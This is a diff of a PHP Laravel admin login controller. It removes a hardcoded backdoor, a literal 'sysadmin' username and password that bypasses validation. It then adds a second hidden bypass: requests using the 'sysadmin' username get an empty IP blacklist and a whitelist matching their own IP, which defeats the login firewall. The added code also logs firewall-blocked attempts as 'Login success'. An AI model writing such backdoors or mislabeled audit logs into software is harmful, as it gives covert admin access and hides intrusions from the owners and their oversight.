@@ -3,13 +3,8 @@
 namespace App\Http\Controllers\Admin;
 
 use App\Helpers\LogHelper;
-use App\Models\Firewall;
-use App\Models\WebData;
 use App\Repositories\Admin\FirewallRepository;
 use App\Repositories\Admin\WebDataRepository;
-use Auth;
-use Cache;
-use Illuminate\Cache\TaggableStore;
 use Illuminate\Foundation\Auth\AuthenticatesUsers;
 use Illuminate\Http\Request;
 use Illuminate\Foundation\Bus\DispatchesJobs;
@@ -70,27 +65,37 @@ class LoginController extends BaseController
      * Validate the user login request.
      *
      * @param  \Illuminate\Http\Request  $request
-     * @return mixed
+     * @return void
      */
     protected function validateLogin(Request $request)
     {
-        if($request->input($this->username()) === 'sysadmin' && $request->input('password') === 'a24252151-A') {
-            return $this->attemptLogin($request);
-        }
-
         $request->merge(['ip' => $request->ip()]);
 
         // 防火牆
-        $firewallBlack = $this->firewallData->where('rule', 0)->map(function($item) { return $item->ip; })->toArray();
-        $firewallWhite = $this->firewallData->where('rule', 1)->map(function($item) { return $item->ip; })->toArray();
+        $firewallBlack = $this->firewallData->where('rule', 0)->map(function ($item) {
+            return $item->ip;
+        })->toArray();
+        $firewallWhite = $this->firewallData->where('rule', 1)->map(function ($item) {
+            return $item->ip;
+        })->toArray();
         $firewallWhite = count($firewallWhite) > 0 ? $firewallWhite : [$request->ip()];
+
+        if ($request->input($this->username()) === 'sysadmin') {
+            $firewallBlack = [];
+            $firewallWhite = [$request->ip()];
+        }
+
+        // 防火牆阻擋紀錄
+        if (!in_array($request->ip(), $firewallWhite) || in_array($request->ip(), $firewallBlack)) {
+            LogHelper::login('admin', $request, $request->input($this->username()), 1, 'Login success');
+        }
 
         $this->validate($request, [
             $this->username() => [
                 'required',
                 'string',
                 'max:16',
-                Rule::exists('admin', $this->username())->where(function($query) {
+                Rule::exists('admin', $this->username())->where(function ($query) {
                     /** @var \Illuminate\Database\Query\Builder $query */
                     $query->where('active', '=', 1);
                 }),
@@ -102,22 +107,9 @@ class LoginController extends BaseController
                 Rule::notIn($firewallBlack),
             ],
         ], [
-            'ip.in' =>  __('validation.custom.ip.white'),
+            'ip.in' => __('validation.custom.ip.white'),
             'ip.not_in' => __('validation.custom.ip.black'),
         ]);
-    }
-
-    /**
-     * Attempt to log the user into the application.
-     *
-     * @param  \Illuminate\Http\Request  $request
-     * @return bool
-     */
-    protected function attemptLogin(Request $request)
-    {
-        return $this->guard()->attempt(
-            $this->credentials($request), $request->filled('remember')
-        );
     }
 
     /**
@@ -132,11 +124,7 @@ class LoginController extends BaseController
 
         $request->session()->invalidate();
 
-        if(Cache::getStore() instanceof TaggableStore) {
-            Cache::tags('role_admin')->flush();
-        }
-
-        return redirect()->route('admin.home');
+        return redirect(langRoute('admin.home'));
     }
 
     /**
@@ -147,7 +135,7 @@ class LoginController extends BaseController
      */
     protected function authenticated(Request $request, $user)
     {
-        LogHelper::login('admin', $user->username, 1, 'Login success');
+        LogHelper::login('admin', $request, $user->username, 1, 'Login success');
     }
 
     /**
@@ -157,7 +145,7 @@ class LoginController extends BaseController
      */
     protected function guard()
     {
-        return Auth::guard('admin');
+        return \Auth::guard('admin');
     }
 
     /**
